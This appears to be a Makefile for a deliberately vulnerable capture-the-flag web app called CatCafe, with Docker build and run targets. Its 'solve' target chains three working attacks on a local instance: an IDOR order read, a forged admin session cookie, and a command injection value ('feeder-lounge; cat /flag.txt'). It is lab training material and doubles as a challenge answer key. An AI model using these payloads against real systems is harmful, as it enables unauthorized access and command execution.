# WEB01_CatCafe — convenience targets
# Usage:  make <target>

IMAGE   ?= catcafe:latest
NAME    ?= catcafe
PORT    ?= 4000
COMPOSE ?= docker compose

.DEFAULT_GOAL := help

.PHONY: help build up down restart logs shell ps rebuild clean solve

help: ## Show available targets
	@awk 'BEGIN {FS=":.*##"; printf "Targets:\n"} /^[a-zA-Z_-]+:.*##/ {printf "  \033[36m%-10s\033[0m %s\n", $$1, $$2}' $(MAKEFILE_LIST)

build: ## Build the Docker image
	$(COMPOSE) build

up: ## Start the cafe in the background (http://localhost:$(PORT))
	$(COMPOSE) up -d
	@echo "→ Purr-fect Beans is live at http://localhost:$(PORT)/"

down: ## Stop and remove the container
	$(COMPOSE) down

restart: down up ## Restart from scratch

logs: ## Tail container logs
	$(COMPOSE) logs -f

shell: ## Open a shell inside the running container
	docker exec -it $(NAME) sh

ps: ## Show container status
	$(COMPOSE) ps

rebuild: ## Force a clean rebuild (no cache) and start
	$(COMPOSE) build --no-cache
	$(COMPOSE) up -d

clean: ## Stop, remove container + image, prune local dev artifacts
	-$(COMPOSE) down --rmi local -v
	rm -rf .venv catcafe.db __pycache__

solve: ## Quick end-to-end sanity check of all three vulns against a running instance
	@echo "=== Stage 1: IDOR ==="
	@curl -s -c /tmp/_cc.jar -o /dev/null -d "username=alice&password=alice1234" http://localhost:$(PORT)/login
	@curl -s -b /tmp/_cc.jar http://localhost:$(PORT)/orders/4 | grep -Eo 'CTF\{[^}]+\}' || echo "  (no flag — is the DB seeded?)"
	@echo "=== Stage 2: forged cookie → /admin ==="
	@FORGED=$$(python3 -c 'import base64,json;print(base64.b64encode(json.dumps({"username":"alice","isAdmin":True},separators=(",",":")).encode()).decode())'); \
	 curl -s -b "session=$$FORGED" http://localhost:$(PORT)/admin | grep -Eo 'CTF\{[^}]+\}'
	@echo "=== Stage 3: command injection → /flag.txt ==="
	@FORGED=$$(python3 -c 'import base64,json;print(base64.b64encode(json.dumps({"username":"alice","isAdmin":True},separators=(",",":")).encode()).decode())'); \
	 curl -s -b "session=$$FORGED" --data-urlencode 'host=feeder-lounge; cat /flag.txt' http://localhost:$(PORT)/admin | grep -Eo 'CTF\{[^}]+\}'
	@rm -f /tmp/_cc.jar
